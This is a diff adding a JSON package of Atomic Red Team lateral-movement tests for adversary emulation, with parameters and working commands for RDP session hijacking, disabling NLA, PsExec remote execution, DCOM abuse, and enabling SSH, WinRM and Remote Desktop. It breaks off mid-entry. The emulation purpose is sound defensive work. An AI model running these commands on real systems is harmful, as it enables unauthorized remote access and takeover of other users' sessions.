@@ -1,0 +1,980 @@
+{
+  "package_id": "art-lateral-v1",
+  "package_name": "ART - Lateral Movement Pack (Red Canary)",
+  "version": "1.0.0",
+  "description": "Red Canary Atomic Red Team scripts for MITRE ATT&CK Lateral Movement (TA0008). 19 atomics covering 8 techniques: T1021.001, T1021.002, T1021.003, T1021.004, T1021.005, T1021.006, T1563.002, T1570. Converted from Red Canary atomic-red-team YAML. Tag keys prefixed with 'art_'.",
+  "author": "Red Canary (converted by X3M.AI)",
+  "created": "2026-08-11",
+  "source": "atomic-red-team",
+  "mitre_domain": "enterprise-attack",
+  "mitre_tactic": "Lateral Movement (TA0008)",
+  "mitre_tactic_name": "Lateral Movement",
+  "mitre_tcodes": [
+    "T1021.001",
+    "T1021.002",
+    "T1021.003",
+    "T1021.004",
+    "T1021.005",
+    "T1021.006",
+    "T1563.002",
+    "T1570"
+  ],
+  "platform": [
+    "linux",
+    "windows"
+  ],
+  "prerequisites": [
+    "Morgana agent installed on target machine",
+    "PyYAML not required at runtime — scripts are pre-converted"
+  ],
+  "tag_categories": [
+    {
+      "category_id": "art_lateral_1021_001",
+      "label": "1021.001 Parameters",
+      "description": "Input parameters for 1021.001 atomic tests.",
+      "scope": "local",
+      "used_by_tcodes": [
+        "1021.001"
+      ],
+      "tags": [
+        {
+          "key": "art_lateral_1021_001_logonserver",
+          "label": "Logonserver",
+          "description": "ComputerName argument default %logonserver%",
+          "default": "$ENV:logonserver.TrimStart(\"\\\")",
+          "example": "$ENV:logonserver.TrimStart(\"\\\")",
+          "sensitive": false,
+          "required": false
+        },
+        {
+          "key": "art_lateral_1021_001_domain",
+          "label": "Domain",
+          "description": "domain argument default %USERDOMAIN%",
+          "default": "$Env:USERDOMAIN",
+          "example": "$Env:USERDOMAIN",
+          "sensitive": false,
+          "required": false
+        },
+        {
+          "key": "art_lateral_1021_001_username",
+          "label": "Username",
+          "description": "Username argument default %username%",
+          "default": "$ENV:USERNAME",
+          "example": "$ENV:USERNAME",
+          "sensitive": false,
+          "required": false
+        },
+        {
+          "key": "art_lateral_1021_001_password",
+          "label": "Password",
+          "description": "Password",
+          "default": "1password2!",
+          "example": "1password2!",
+          "sensitive": false,
+          "required": false
+        },
+        {
+          "key": "art_lateral_1021_001_old_remote_port",
+          "label": "Old Remote Port",
+          "description": "Default RDP Listening Port",
+          "default": "3389",
+          "example": "3389",
+          "sensitive": false,
+          "required": false
+        },
+        {
+          "key": "art_lateral_1021_001_new_remote_port",
+          "label": "New Remote Port",
+          "description": "New RDP Listening Port",
+          "default": "4489",
+          "example": "4489",
+          "sensitive": false,
+          "required": false
+        },
+        {
+          "key": "art_lateral_1021_001_default_userauthentication",
+          "label": "Default Userauthentication",
+          "description": "Default UserAuthentication registry value",
+          "default": "1",
+          "example": "1",
+          "sensitive": false,
+          "required": false
+        }
+      ]
+    },
+    {
+      "category_id": "art_lateral_1021_002",
+      "label": "1021.002 Parameters",
+      "description": "Input parameters for 1021.002 atomic tests.",
+      "scope": "local",
+      "used_by_tcodes": [
+        "1021.002"
+      ],
+      "tags": [
+        {
+          "key": "art_lateral_1021_002_user_name",
+          "label": "User Name",
+          "description": "Username",
+          "default": "DOMAIN\\Administrator",
+          "example": "DOMAIN\\Administrator",
+          "sensitive": false,
+          "required": false
+        },
+        {
+          "key": "art_lateral_1021_002_share_name",
+          "label": "Share Name",
+          "description": "Examples C$, IPC$, Admin$",
+          "default": "C$",
+          "example": "C$",
+          "sensitive": false,
+          "required": false
+        },
+        {
+          "key": "art_lateral_1021_002_password",
+          "label": "Password",
+          "description": "Password",
+          "default": "P@ssw0rd1",
+          "example": "P@ssw0rd1",
+          "sensitive": false,
+          "required": false
+        },
+        {
+          "key": "art_lateral_1021_002_computer_name",
+          "label": "Computer Name",
+          "description": "Target Computer Name",
+          "default": "Target",
+          "example": "Target",
+          "sensitive": false,
+          "required": false
+        },
+        {
+          "key": "art_lateral_1021_002_map_name",
+          "label": "Map Name",
+          "description": "Mapped Drive Letter",
+          "default": "g",
+          "example": "g",
+          "sensitive": false,
+          "required": false
+        },
+        {
+          "key": "art_lateral_1021_002_command_path",
+          "label": "Command Path",
+          "description": "File to copy and execute",
+          "default": "C:\\Windows\\System32\\cmd.exe",
+          "example": "C:\\Windows\\System32\\cmd.exe",
+          "sensitive": false,
+          "required": false
+        },
+        {
+          "key": "art_lateral_1021_002_remote_host",
+          "label": "Remote Host",
+          "description": "Remote computer to receive the copy and execute the file",
+          "default": "\\\\localhost",
+          "example": "\\\\localhost",
+          "sensitive": false,
+          "required": false
+        },
+        {
+          "key": "art_lateral_1021_002_psexec_exe",
+          "label": "Psexec Exe",
+          "description": "Path to PsExec",
+          "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe",
+          "example": "PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe",
+          "sensitive": false,
+          "required": false
+        },
+        {
+          "key": "art_lateral_1021_002_output_file",
+          "label": "Output File",
+          "description": "Remote computer to receive the copy and execute the file",
+          "default": "output.txt",
+          "example": "output.txt",
+          "sensitive": false,
+          "required": false
+        },
+        {
+          "key": "art_lateral_1021_002_command_to_execute",
+          "label": "Command To Execute",
+          "description": "Command to execute for output.",
+          "default": "hostname",
+          "example": "hostname",
+          "sensitive": false,
+          "required": false
+        }
+      ]
+    },
+    {
+      "category_id": "art_lateral_1021_003",
+      "label": "1021.003 Parameters",
+      "description": "Input parameters for 1021.003 atomic tests.",
+      "scope": "local",
+      "used_by_tcodes": [
+        "1021.003"
+      ],
+      "tags": [
+        {
+          "key": "art_lateral_1021_003_computer_name",
+          "label": "Computer Name",
+          "description": "Name of Computer",
+          "default": "localhost",
+          "example": "localhost",
+          "sensitive": false,
+          "required": false
+        },
+        {
+          "key": "art_lateral_1021_003_user",
+          "label": "User",
+          "description": "Name of user",
+          "default": "admin",
+          "example": "admin",
+          "sensitive": false,
+          "required": false
+        }
+      ]
+    },
+    {
+      "category_id": "art_lateral_1021_004",
+      "label": "1021.004 Parameters",
+      "description": "Input parameters for 1021.004 atomic tests.",
+      "scope": "local",
+      "used_by_tcodes": [
+        "1021.004"
+      ],
+      "tags": [
+        {
+          "key": "art_lateral_1021_004_vm_host",
+          "label": "Vm Host",
+          "description": "Specify the host name of the ESXi Server",
+          "default": "atomic.local",
+          "example": "atomic.local",
+          "sensitive": false,
+          "required": false
+        },
+        {
+          "key": "art_lateral_1021_004_vm_user",
+          "label": "Vm User",
+          "description": "Specify the privilege user account on ESXi Server",
+          "default": "root",
+          "example": "root",
+          "sensitive": false,
+          "required": false
+        },
+        {
+          "key": "art_lateral_1021_004_vm_pass",
+          "label": "Vm Pass",
+          "description": "Specify the privilege user password on ESXi Server",
+          "default": "pass",
+          "example": "pass",
+          "sensitive": false,
+          "required": false
+        },
+        {
+          "key": "art_lateral_1021_004_plink_file",
+          "label": "Plink File",
+          "description": "Path to Plink",
+          "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\plink.exe",
+          "example": "PathToAtomicsFolder\\..\\ExternalPayloads\\plink.exe",
+          "sensitive": false,
+          "required": false
+        }
+      ]
+    },
+    {
+      "category_id": "art_lateral_1021_006",
+      "label": "1021.006 Parameters",
+      "description": "Input parameters for 1021.006 atomic tests.",
+      "scope": "local",
+      "used_by_tcodes": [
+        "1021.006"
+      ],
+      "tags": [
+        {
+          "key": "art_lateral_1021_006_user_name",
+          "label": "User Name",
+          "description": "Username",
+          "default": "Domain\\Administrator",
+          "example": "Domain\\Administrator",
+          "sensitive": false,
+          "required": false
+        },
+        {
+          "key": "art_lateral_1021_006_destination_address",
+          "label": "Destination Address",
+          "description": "Remote Host IP or Hostname",
+          "default": "Target",
+          "example": "Target",
+          "sensitive": false,
+          "required": false
+        },
+        {
+          "key": "art_lateral_1021_006_password",
+          "label": "Password",
+          "description": "Password",
+          "default": "P@ssw0rd1",
+          "example": "P@ssw0rd1",
+          "sensitive": false,
+          "required": false
+        }
+      ]
+    },
+    {
+      "category_id": "art_lateral_1563_002",
+      "label": "1563.002 Parameters",
+      "description": "Input parameters for 1563.002 atomic tests.",
+      "scope": "local",
+      "used_by_tcodes": [
+        "1563.002"
+      ],
+      "tags": [
+        {
+          "key": "art_lateral_1563_002_session_id",
+          "label": "Session Id",
+          "description": "The ID of the session to which you want to connect",
+          "default": "1337",
+          "example": "1337",
+          "sensitive": false,
+          "required": false
+        },
+        {
+          "key": "art_lateral_1563_002_destination_id",
+          "label": "Destination Id",
+          "description": "Connect the session of another user to a different session",
+          "default": "rdp-tcp#55",
+          "example": "rdp-tcp#55",
+          "sensitive": false,
+          "required": false
+        }
+      ]
+    },
+    {
+      "category_id": "art_lateral_1570",
+      "label": "1570 Parameters",
+      "description": "Input parameters for 1570 atomic tests.",
+      "scope": "local",
+      "used_by_tcodes": [
+        "1570"
+      ],
+      "tags": [
+        {
+          "key": "art_lateral_1570_remote_path",
+          "label": "Remote Path",
+          "description": "The UNC path to the share on the file server",
+          "default": "\\\\example.com\\sales",
+          "example": "\\\\example.com\\sales",
+          "sensitive": false,
+          "required": false
+        },
+        {
+          "key": "art_lateral_1570_local_file",
+          "label": "Local File",
+          "description": "The local file to be transferred",
+          "default": "C:\\path\\to\\file.txt",
+          "example": "C:\\path\\to\\file.txt",
+          "sensitive": false,
+          "required": false
+        }
+      ]
+    }
+  ],
+  "scripts": [
+    {
+      "id": "ART - T1021.001 - RDP to DomainController",
+      "name": "ART - T1021.001 - RDP to DomainController",
+      "description": "Attempt an RDP session via Remote Desktop Application to a DomainController.\n",
+      "tactic": "Lateral Movement",
+      "tcode": "T1021.001",
+      "technique_name": "RDP to DomainController",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [
+        "art_lateral_1021_001_logonserver",
+        "art_lateral_1021_001_domain",
+        "art_lateral_1021_001_username",
+        "art_lateral_1021_001_password"
+      ],
+      "command": "$Server=#{art_lateral_1021_001_logonserver}\n$User = Join-Path #{art_lateral_1021_001_domain} #{art_lateral_1021_001_username}\n$Password=\"#{art_lateral_1021_001_password}\"\ncmdkey /generic:TERMSRV/$Server /user:$User /pass:$Password\nmstsc /v:$Server\necho \"RDP connection established\"",
+      "cleanup_command": "$p=Tasklist /svc /fi \"IMAGENAME eq mstsc.exe\" /fo csv | convertfrom-csv\nif(-not ([string]::IsNullOrEmpty($p.PID))) { Stop-Process -Id $p.PID }",
+      "detection_rule": "See MITRE ATT&CK page for detection guidance",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "source": "atomic-red-team",
+      "atomic_guid": "355d4632-8cb9-449d-91ce-b566d0253d3e"
+    },
+    {
+      "id": "ART - T1021.001 - Changing RDP Port to Non Standard Port via Powershell",
+      "name": "ART - T1021.001 - Changing RDP Port to Non Standard Port via Powershell",
+      "description": "Changing RDP Port to Non Standard Port via Powershell\n",
+      "tactic": "Lateral Movement",
+      "tcode": "T1021.001",
+      "technique_name": "Changing RDP Port to Non Standard Port via Powershell",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [
+        "art_lateral_1021_001_old_remote_port",
+        "art_lateral_1021_001_new_remote_port"
+      ],
+      "command": "Set-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp' -name \"PortNumber\" -Value #{art_lateral_1021_001_new_remote_port}\nNew-NetFirewallRule -DisplayName 'RDPPORTLatest-TCP-In' -Profile 'Public' -Direction Inbound -Action Allow -Protocol TCP -LocalPort #{art_lateral_1021_001_new_remote_port}",
+      "cleanup_command": "Set-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp' -name \"PortNumber\" -Value #{art_lateral_1021_001_old_remote_port}\nRemove-NetFirewallRule -DisplayName \"RDPPORTLatest-TCP-In\" -ErrorAction Ignore \nGet-Service TermService | Restart-Service -Force -ErrorAction Ignore",
+      "detection_rule": "See MITRE ATT&CK page for detection guidance",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "source": "atomic-red-team",
+      "atomic_guid": "2f840dd4-8a2e-4f44-beb3-6b2399ea3771"
+    },
+    {
+      "id": "ART - T1021.001 - Changing RDP Port to Non Standard Port via Command_Prompt",
+      "name": "ART - T1021.001 - Changing RDP Port to Non Standard Port via Command_Prompt",
+      "description": "Changing RDP Port to Non Standard Port via Command_Prompt\n",
+      "tactic": "Lateral Movement",
+      "tcode": "T1021.001",
+      "technique_name": "Changing RDP Port to Non Standard Port via Command_Prompt",
+      "executor": "cmd",
+      "platform": "windows",
+      "required_tags": [
+        "art_lateral_1021_001_old_remote_port",
+        "art_lateral_1021_001_new_remote_port"
+      ],
+      "command": "reg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v PortNumber /t REG_DWORD /d #{art_lateral_1021_001_new_remote_port} /f\nnetsh advfirewall firewall add rule name=\"RDPPORTLatest-TCP-In\" dir=in action=allow protocol=TCP localport=#{art_lateral_1021_001_new_remote_port}",
+      "cleanup_command": "reg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v PortNumber /t REG_DWORD /d #{art_lateral_1021_001_old_remote_port} /f >nul 2>&1\nnetsh advfirewall firewall delete rule name=\"RDPPORTLatest-TCP-In\" >nul 2>&1\nnet stop TermService /y >nul 2>&1\nnet start TermService >nul 2>&1",
+      "detection_rule": "See MITRE ATT&CK page for detection guidance",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "source": "atomic-red-team",
+      "atomic_guid": "74ace21e-a31c-4f7d-b540-53e4eb6d1f73"
+    },
+    {
+      "id": "ART - T1021.001 - Disable NLA for RDP via Command Prompt",
+      "name": "ART - T1021.001 - Disable NLA for RDP via Command Prompt",
+      "description": "Disables network-level authentication (NLA) for RDP by changing a registry key via Command Prompt\nDisabling NLA for RDP can allow remote user interaction with the Windows sign-in screen prior to authentication. According to Microsoft, Flax Typhoon actors used this technique implementation to achi...",
+      "tactic": "Lateral Movement",
+      "tcode": "T1021.001",
+      "technique_name": "Disable NLA for RDP via Command Prompt",
+      "executor": "cmd",
+      "platform": "windows",
+      "required_tags": [
+        "art_lateral_1021_001_default_userauthentication"
+      ],
+      "command": "reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v UserAuthentication /d 0 /t REG_DWORD /f",
+      "cleanup_command": "reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v UserAuthentication /d #{art_lateral_1021_001_default_userauthentication} /t REG_DWORD -f >nul 2>&1",
+      "detection_rule": "See MITRE ATT&CK page for detection guidance",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "source": "atomic-red-team",
+      "atomic_guid": "01d1c6c0-faf0-408e-b368-752a02285cb2"
+    },
+    {
+      "id": "ART - T1021.002 - Map admin share",
+      "name": "ART - T1021.002 - Map admin share",
+      "description": "Connecting To Remote Shares\n",
+      "tactic": "Lateral Movement",
+      "tcode": "T1021.002",
+      "technique_name": "Map admin share",
+      "executor": "cmd",
+      "platform": "windows",
+      "required_tags": [
+        "art_lateral_1021_002_user_name",
+        "art_lateral_1021_002_share_name",
+        "art_lateral_1021_002_password",
+        "art_lateral_1021_002_computer_name"
+      ],
+      "command": "cmd.exe /c \"net use \\\\#{art_lateral_1021_002_computer_name}\\#{art_lateral_1021_002_share_name} #{art_lateral_1021_002_password} /u:#{art_lateral_1021_002_user_name}\"",
+      "cleanup_command": "",
+      "detection_rule": "See MITRE ATT&CK page for detection guidance",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "source": "atomic-red-team",
+      "atomic_guid": "3386975b-367a-4fbb-9d77-4dcf3639ffd3"
+    },
+    {
+      "id": "ART - T1021.002 - Map Admin Share PowerShell",
+      "name": "ART - T1021.002 - Map Admin Share PowerShell",
+      "description": "Map Admin share utilizing PowerShell\n",
+      "tactic": "Lateral Movement",
+      "tcode": "T1021.002",
+      "technique_name": "Map Admin Share PowerShell",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [
+        "art_lateral_1021_002_share_name",
+        "art_lateral_1021_002_map_name",
+        "art_lateral_1021_002_computer_name"
+      ],
+      "command": "New-PSDrive -name #{art_lateral_1021_002_map_name} -psprovider filesystem -root \\\\#{art_lateral_1021_002_computer_name}\\#{art_lateral_1021_002_share_name}",
+      "cleanup_command": "",
+      "detection_rule": "See MITRE ATT&CK page for detection guidance",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "source": "atomic-red-team",
+      "atomic_guid": "514e9cd7-9207-4882-98b1-c8f791bae3c5"
+    },
+    {
+      "id": "ART - T1021.002 - Copy and Execute File with PsExec",
+      "name": "ART - T1021.002 - Copy and Execute File with PsExec",
+      "description": "Copies a file to a remote host and executes it using PsExec. Requires the download of PsExec from [https://docs.microsoft.com/en-us/sysinternals/downloads/psexec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec).\n",
+      "tactic": "Lateral Movement",
+      "tcode": "T1021.002",
+      "technique_name": "Copy and Execute File with PsExec",
+      "executor": "cmd",
+      "platform": "windows",
+      "required_tags": [
+        "art_lateral_1021_002_command_path",
+        "art_lateral_1021_002_remote_host",
+        "art_lateral_1021_002_psexec_exe"
+      ],
+      "command": "\"#{art_lateral_1021_002_psexec_exe}\" #{art_lateral_1021_002_remote_host} -accepteula -c #{art_lateral_1021_002_command_path}",
+      "cleanup_command": "",
+      "detection_rule": "See MITRE ATT&CK page for detection guidance",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "source": "atomic-red-team",
+      "atomic_guid": "0eb03d41-79e4-4393-8e57-6344856be1cf"
+    },
+    {
+      "id": "ART - T1021.002 - Execute command writing output to local Admin Share",
+      "name": "ART - T1021.002 - Execute command writing output to local Admin Share",
+      "description": "Executes a command, writing the output to a local Admin Share.\nThis technique is used by post-exploitation frameworks.\n",
+      "tactic": "Lateral Movement",
+      "tcode": "T1021.002",
+      "technique_name": "Execute command writing output to local Admin Share",
+      "executor": "cmd",
+      "platform": "windows",
+      "required_tags": [
+        "art_lateral_1021_002_output_file",
+        "art_lateral_1021_002_command_to_execute"
+      ],
+      "command": "cmd.exe /Q /c #{art_lateral_1021_002_command_to_execute} 1> \\\\127.0.0.1\\ADMIN$\\#{art_lateral_1021_002_output_file} 2>&1",
+      "cleanup_command": "",
+      "detection_rule": "See MITRE ATT&CK page for detection guidance",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "source": "atomic-red-team",
+      "atomic_guid": "d41aaab5-bdfe-431d-a3d5-c29e9136ff46"
+    },
+    {
+      "id": "ART - T1021.003 - PowerShell Lateral Movement using MMC20",
+      "name": "ART - T1021.003 - PowerShell Lateral Movement using MMC20",
+      "description": "Powershell lateral movement using the mmc20 application com object.\n\nReference:\n\nhttps://blog.cobaltstrike.com/2017/01/24/scripting-matt-nelsons-mmc20-application-lateral-movement-technique/\n\nUpon successful execution, cmd will spawn calc.exe on a remote computer.\n",
+      "tactic": "Lateral Movement",
+      "tcode": "T1021.003",
+      "technique_name": "PowerShell Lateral Movement using MMC20",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [
+        "art_lateral_1021_003_computer_name"
+      ],
+      "command": "[activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.application\",\"#{art_lateral_1021_003_computer_name}\")).Document.ActiveView.ExecuteShellCommand(\"c:\\windows\\system32\\calc.exe\", $null, $null, \"7\")",
+      "cleanup_command": "",
+      "detection_rule": "See MITRE ATT&CK page for detection guidance",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "source": "atomic-red-team",
+      "atomic_guid": "6dc74eb1-c9d6-4c53-b3b5-6f50ae339673"
+    },
+    {
+      "id": "ART - T1021.003 - PowerShell Lateral Movement Using Excel Application Object",
+      "name": "ART - T1021.003 - PowerShell Lateral Movement Using Excel Application Object",
+      "description": "Powershell lateral movement using the Excel COM objects.\n\nReference:\n\nhttps://posts.specterops.io/lateral-movement-abuse-the-power-of-dcom-excel-application-3c016d0d9922\n\nUpon successful execution, cmd will spawn calc.exe on a remote computer.\n",
+      "tactic": "Lateral Movement",
+      "tcode": "T1021.003",
+      "technique_name": "PowerShell Lateral Movement Using Excel Application Object",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [
+        "art_lateral_1021_003_computer_name",
+        "art_lateral_1021_003_user"
+      ],
+      "command": "copy c:\\windows\\system32\\calc.exe 'C:\\users\\#{art_lateral_1021_003_user}\\AppData\\local\\Microsoft\\WindowsApps\\foxprow.exe'\n$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(\"Excel.Application\",\"#{art_lateral_1021_003_computer_name}\"))\n$com.ActivateMicrosoftApp(\"5\")",
+      "cleanup_command": "Remove-Item 'C:\\users\\#{art_lateral_1021_003_user}\\AppData\\local\\Microsoft\\WindowsApps\\foxprow.exe'",
+      "detection_rule": "See MITRE ATT&CK page for detection guidance",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "source": "atomic-red-team",
+      "atomic_guid": "505f24be-1c11-4694-b614-e01ae1cd2570"
+    },
+    {
+      "id": "ART - T1021.004 - ESXi - Enable SSH via PowerCLI",
+      "name": "ART - T1021.004 - ESXi - Enable SSH via PowerCLI",
+      "description": "An adversary enables the SSH service on a ESXi host to maintain persistent access to the host and to carryout subsequent operations.\n",
+      "tactic": "Lateral Movement",
+      "tcode": "T1021.004",
+      "technique_name": "ESXi - Enable SSH via PowerCLI",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [
+        "art_lateral_1021_004_vm_host",
+        "art_lateral_1021_004_vm_user",
+        "art_lateral_1021_004_vm_pass"
+      ],
+      "command": "Set-PowerCLIConfiguration -InvalidCertificateAction Ignore -ParticipateInCEIP:$false -Confirm:$false \nConnect-VIServer -Server #{art_lateral_1021_004_vm_host} -User #{art_lateral_1021_004_vm_user} -Password #{art_lateral_1021_004_vm_pass}\nGet-VMHostService -VMHost #{art_lateral_1021_004_vm_host} | Where-Object {$_.Key -eq \"TSM-SSH\" } | Start-VMHostService -Confirm:$false",
+      "cleanup_command": "Set-PowerCLIConfiguration -InvalidCertificateAction Ignore -ParticipateInCEIP:$false -Confirm:$false \nConnect-VIServer -Server #{art_lateral_1021_004_vm_host} -User #{art_lateral_1021_004_vm_user} -Password #{art_lateral_1021_004_vm_pass}\nGet-VMHostService -VMHost #{art_lateral_1021_004_vm_host} | Where-Object {$_.Key -eq \"TSM-SSH\" } | Stop-VMHostService -Confirm:$false",
+      "detection_rule": "See MITRE ATT&CK page for detection guidance",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "source": "atomic-red-team",
+      "atomic_guid": "8f6c14d1-f13d-4616-b7fc-98cc69fe56ec"
+    },
+    {
+      "id": "ART - T1021.004 - ESXi - Enable SSH via VIM-CMD",
+      "name": "ART - T1021.004 - ESXi - Enable SSH via VIM-CMD",
+      "description": "An adversary enables SSH on an ESXi host to maintain persistence and creeate another command execution interface.\n[Reference](https://lolesxi-project.github.io/LOLESXi/lolesxi/Binaries/vim-cmd/#enable%20service)\n",
+      "tactic": "Lateral Movement",
+      "tcode": "T1021.004",
+      "technique_name": "ESXi - Enable SSH via VIM-CMD",
+      "executor": "cmd",
+      "platform": "windows",
+      "required_tags": [
+        "art_lateral_1021_004_vm_host",
+        "art_lateral_1021_004_vm_user",
+        "art_lateral_1021_004_vm_pass",
+        "art_lateral_1021_004_plink_file"
+      ],
+      "command": "echo \"\" | \"#{art_lateral_1021_004_plink_file}\" -batch \"#{art_lateral_1021_004_vm_host}\" -ssh -l #{art_lateral_1021_004_vm_user} -pw \"#{art_lateral_1021_004_vm_pass}\" \"vim-cmd hostsvc/enable_ssh\"",
+      "cleanup_command": "echo \"\" | \"#{art_lateral_1021_004_plink_file}\" -batch \"#{art_lateral_1021_004_vm_host}\" -ssh -l #{art_lateral_1021_004_vm_user} -pw \"#{art_lateral_1021_004_vm_pass}\" \"vim-cmd hostsvc/disable_ssh\"",
+      "detection_rule": "See MITRE ATT&CK page for detection guidance",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "source": "atomic-red-team",
+      "atomic_guid": "280812c8-4dae-43e9-a74e-1d08ab997c0e"
+    },
+    {
+      "id": "ART - T1021.005 - Enable Apple Remote Desktop Agent",
+      "name": "ART - T1021.005 - Enable Apple Remote Desktop Agent",
+      "description": "ARD leverages a blend of protocols, including VNC to send the screen and control buffers and SSH for secure file transfer. \nAdversaries can abuse ARD to gain remote code execution and perform lateral movement.\n\nReferences:  https://www.mandiant.com/resources/blog/leveraging-apple-remote-desktop-f...",
+      "tactic": "Lateral Movement",
+      "tcode": "T1021.005",
+      "technique_name": "Enable Apple Remote Desktop Agent",
+      "executor": "bash",
+      "platform": "linux",
+      "required_tags": [],
+      "command": "sudo /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart -activate -configure -allowAccessFor -allUsers -privs -all -quiet",
+      "cleanup_command": "sudo /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart -deactivate -stop -configure -privs -none -quiet",
+      "detection_rule": "See MITRE ATT&CK page for detection guidance",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "source": "atomic-red-team",
+      "atomic_guid": "8a930abe-841c-4d4f-a877-72e9fe90b9ea"
+    },
+    {
+      "id": "ART - T1021.006 - Enable Windows Remote Management",
+      "name": "ART - T1021.006 - Enable Windows Remote Management",
+      "description": "Powershell Enable WinRM\n\nUpon successful execution, powershell will \"Enable-PSRemoting\" allowing for remote PS access.\n",
+      "tactic": "Lateral Movement",
+      "tcode": "T1021.006",
+      "technique_name": "Enable Windows Remote Management",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "Enable-PSRemoting -Force",
+      "cleanup_command": "",
+      "detection_rule": "See MITRE ATT&CK page for detection guidance",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "source": "atomic-red-team",
+      "atomic_guid": "9059e8de-3d7d-4954-a322-46161880b9cf"
+    },
+    {
+      "id": "ART - T1021.006 - Remote Code Execution with PS Credentials Using Invoke-Co...",
+      "name": "ART - T1021.006 - Remote Code Execution with PS Credentials Using Invoke-Co...",
+      "description": "Simulate lateral movement with PowerShell Remoting on the local host. \nUpon successful execution, PowerShell will execute `whoami` using `Invoke-Command`, targeting the \nlocal machine as remote target.\n",
+      "tactic": "Lateral Movement",
+      "tcode": "T1021.006",
+      "technique_name": "Remote Code Execution with PS Credentials Using Invoke-Co...",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "Enable-PSRemoting -Force\nInvoke-Command -ComputerName $env:COMPUTERNAME -ScriptBlock {whoami}",
+      "cleanup_command": "Disable-PSRemoting -Force",
+      "detection_rule": "See MITRE ATT&CK page for detection guidance",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "source": "atomic-red-team",
+      "atomic_guid": "5295bd61-bd7e-4744-9d52-85962a4cf2d6"
+    },
+    {
+      "id": "ART - T1021.006 - WinRM Access with Evil-WinRM",
+      "name": "ART - T1021.006 - WinRM Access with Evil-WinRM",
+      "description": "An adversary may attempt to use Evil-WinRM with a valid account to interact with remote systems that have WinRM enabled",
+      "tactic": "Lateral Movement",
+      "tcode": "T1021.006",
+      "technique_name": "WinRM Access with Evil-WinRM",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [
+        "art_lateral_1021_006_user_name",
+        "art_lateral_1021_006_destination_address",
+        "art_lateral_1021_006_password"
+      ],
+      "command": "evil-winrm -i #{art_lateral_1021_006_destination_address} -u #{art_lateral_1021_006_user_name} -p #{art_lateral_1021_006_password}",
+      "cleanup_command": "",
+      "detection_rule": "See MITRE ATT&CK page for detection guidance",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "source": "atomic-red-team",
+      "atomic_guid": "efe86d95-44c4-4509-ae42-7bfd9d1f5b3d"
+    },
+    {
+      "id": "ART - T1563.002 - RDP hijacking",
+      "name": "ART - T1563.002 - RDP hijacking",
+      "description": "[RDP hijacking](https://medium.com/@networksecurity/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6) - how to hijack RDS and RemoteApp sessions transparently to move through an organization\n",
+      "tactic": "Lateral Movement",
+      "tcode": "T1563.002",
+      "technique_name": "RDP hijacking",
+      "executor": "cmd",
+      "platform": "windows",
+      "required_tags": [
+        "art_lateral_1563_002_session_id",
+        "art_lateral_1563_002_destination_id"
+      ],
+      "command": "query user\nsc.exe create sesshijack binpath= \"cmd.exe /k tscon #{art_lateral_1563_002_session_id} /dest:#{art_lateral_1563_002_destination_id}\"\nnet start sesshijack",
+      "cleanup_command": "sc.exe delete sesshijack >nul 2>&1",
+      "detection_rule": "See MITRE ATT&CK page for detection guidance",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "source": "atomic-red-team",
+      "atomic_guid": "a37ac520-b911-458e-8aed-c5f1576d9f46"
+    },
+    {
+      "id": "ART - T1570 - Exfiltration Over SMB over QUIC (New-SmbMapping)",
+      "name": "ART - T1570 - Exfiltration Over SMB over QUIC (New-SmbMapping)",
+      "description": "Simulates an attacker exfiltrating data over SMB over QUIC using the New-SmbMapping command.\nPrerequisites:\n  - A file server running Windows Server 2022 Datacenter: Azure Edition\n  - A Windows 11 computer\n  - Windows Admin Center\n",
+      "tactic": "Lateral Movement",
+      "tcode": "T1570",
+      "technique_name": "Exfiltration Over SMB over QUIC (New-SmbMapping)",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [
